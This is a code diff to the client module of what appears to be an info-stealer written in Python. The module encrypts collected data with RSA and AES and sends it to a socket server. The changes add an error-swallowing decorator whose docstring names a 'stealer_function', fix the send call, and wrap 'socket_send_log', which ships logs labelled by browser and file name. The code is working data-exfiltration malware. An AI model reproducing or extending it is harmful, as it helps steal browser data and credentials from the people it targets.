@@ -6,12 +6,12 @@ from base64 import b64encode, b64decode
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import AES, PKCS1_OAEP
 
-from util.general import FORMAT, try_extract
+from util.general import FORMAT
 
 
 """ CONSTANTS """
 ADDRESS_HOST = 'localhost'
-ADDRESS_PORT = 1234
+ADDRESS_PORT = 4813
 
 PUBLIC_KEY_LEN = 600
 CLIENT_DATA_LEN = 256
@@ -23,7 +23,24 @@ socket_info = {
 }
 
 
-@try_extract
+def try_socket(socket_function):
+    """ Decorator function which ignores Exceptions when calling stealer_function """
+    def wrapper(*args, **kwargs):
+        try:
+            # Try calling socket_function
+            socket_function(*args, **kwargs)
+        except AttributeError as e:
+            # Ignore errors related to no socket connection when sending
+            if e != "'NoneType' object has no attribute 'send'":
+                print(e)
+        except Exception as e:
+            # Ignore any Exceptions
+            print(e)
+
+    return wrapper
+
+
+@try_socket
 def socket_initialise() -> None:
     """ Creates socket connection to server """
     # connect to server
@@ -68,7 +85,7 @@ def socket_send_data(data: dict) -> None:
     # no socket connection
     if not socket_info['client']:
         return
-    
+
     # encode data
     encoded_data = json.dumps(data).encode(FORMAT)
 
@@ -89,9 +106,10 @@ def socket_send_data(data: dict) -> None:
         padding = b' ' * (CLIENT_DATA_LEN - len(encrypted_block))
 
         # send block
-        client.send(encrypted_block + padding)
+        socket_info['client'].send(encrypted_block + padding)
 
 
+@try_socket
 def socket_send_log(data: dict, browser_name: str, file_name: str) -> None:
     """ Send log to socket server """
     socket_send_data({
